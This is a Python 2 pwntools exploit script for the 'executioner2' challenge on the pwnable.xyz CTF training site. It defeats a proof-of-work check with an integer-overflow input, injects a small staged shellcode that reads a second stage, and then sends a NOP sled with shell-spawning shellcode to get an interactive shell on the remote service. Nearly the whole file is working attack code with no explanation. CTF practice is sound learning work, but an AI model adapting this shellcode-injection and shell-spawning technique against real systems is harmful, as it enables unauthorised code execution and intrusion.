#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
from z3 import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/ctfs/train/pwnable.xyz/executioner2/image/challenge/challenge")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def pow_bypass():
    r.recvuntil("POW:")
    powo = str(r.recv()).replace("\\n>",'').replace("'","").replace(">",'').split()
    res = int(powo[4],16)
    log.info("pow: " + str(res))
    # s = Solver()
    # x = Int("x")
    # y = Int("y")
    # s.add(x != 0)
    # s.add( x > 0)
    # s.add(y != 0)
    # s.add( y > 0)
    # s.add(x + y == res)
    # s.check()
    # exp = (s.model())
    # exp = str(exp).replace("[","").replace("]","").replace(",","").split()
    # y = exp[2]
    # x = exp[5]
    # log.info("result: " + str([x,y]))
    r.sendline(str(0x80000000+res) + ' ' + str(0x80000000))


def exploit(r):
    attach(r)
    pow_bypass()
    a = '''
    mov rsi, rdx
    mov rdx,100
    syscall
    '''
    x = asm(a)
    r.sendline("\x00\x02" + x)
    p = "\x90" * 0xf
    p += asm(shellcraft.sh())
    r.sendline(p)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30028)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
